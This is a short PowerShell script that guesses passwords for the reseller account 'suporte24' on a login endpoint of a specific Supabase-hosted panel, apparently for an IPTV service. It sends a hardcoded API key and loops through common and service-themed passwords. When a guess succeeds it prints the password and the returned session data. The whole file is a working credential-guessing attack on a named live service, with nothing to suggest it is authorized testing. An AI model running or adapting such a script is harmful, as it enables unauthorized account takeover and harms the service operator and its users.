$headers = @{
    apikey = 'sb_publishable_Jsb0b0Kcf5-bv6GCUFu3KA_wO1G9HjM'
    Authorization = 'Bearer sb_publishable_Jsb0b0Kcf5-bv6GCUFu3KA_wO1G9HjM'
    'Content-Type' = 'application/json'
}

foreach ($pass in @("suporte24", "suporte", "1234", "123456", "admin", "eagle", "playtv", "PlayTV")) {
    $body = @{
        p_reseller_id = 'suporte24'
        p_password = $pass
    } | ConvertTo-Json

    try {
        $resp = Invoke-RestMethod -Uri 'https://myreymyqsnikjdhnstjn.supabase.co/rest/v1/rpc/panel_login_dashboard' -Method Post -Headers $headers -Body $body
        Write-Host "FOUND PASSWORD: $pass" -ForegroundColor Green
        $resp | ConvertTo-Json -Depth 3
        break
    } catch {
        # invalid
    }
}
